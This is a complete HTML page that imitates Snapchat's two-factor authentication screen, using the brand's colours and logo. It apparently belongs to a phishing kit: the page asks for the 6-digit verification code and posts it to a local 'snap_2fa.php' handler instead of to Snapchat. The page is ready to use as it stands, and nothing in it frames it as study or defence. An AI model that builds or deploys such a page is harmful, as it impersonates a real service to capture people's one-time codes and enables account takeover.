<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Snapchat - Two Factor Authentication</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background-color: #FFFC00;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background: white;
      width: 90%;
      max-width: 400px;
      padding: 30px 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      text-align: center;
    }

    .snap-logo {
      width: 60px;
      margin-bottom: 20px;
    }

    h2 {
      color: #000;
      font-size: 20px;
      margin-bottom: 10px;
    }

    p {
      font-size: 14px;
      color: #333;
      margin-bottom: 20px;
    }

    input[type="text"] {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      border: 2px solid #ccc;
      border-radius: 8px;
      text-align: center;
      margin-bottom: 20px;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #FFFC00;
      border: none;
      font-weight: bold;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s ease-in-out;
    }

    button:hover {
      background-color: #f1ea00;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/800px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="snap-logo" />
    <h2>Two-Factor Authentication</h2>
    <p>Enter the 6-digit verification code sent to your device.</p>
    <form method="POST" action="snap_2fa.php">
      <input type="text" name="code" maxlength="6" pattern="\d{6}" required />
      <button type="submit">Verify</button>
    </form>
  </div>
</body>
</html>
